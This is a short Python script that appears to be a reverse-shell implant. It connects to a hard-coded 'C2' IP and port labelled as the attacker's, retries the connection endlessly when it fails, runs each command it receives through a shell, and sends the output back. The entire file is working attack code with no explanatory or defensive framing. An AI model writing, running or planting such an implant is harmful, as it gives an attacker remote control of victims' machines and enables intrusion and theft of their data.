import socket
import subprocess
import os

C2_IP = '192.168.182.128'  # Your attacker IP
C2_PORT = 4444             # Port to listen on the attacker side

def connect_to_c2():
    while True:
        try:
            # Create a socket and connect to attacker
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))

            while True:
                command = s.recv(1024).decode()

                if command.lower() == 'exit':
                    break

                elif command.startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        s.send(f"[+] Changed to {os.getcwd()}".encode())
                    except Exception as e:
                        s.send(str(e).encode())

                else:
                    result = subprocess.run(command, shell=True, capture_output=True)
                    output = result.stdout + result.stderr
                    s.send(output if output else b"[+] Command executed.")

            s.close()
            break  # Exit after connection ends

        except Exception:
            continue  # Retry if connection fails

connect_to_c2()
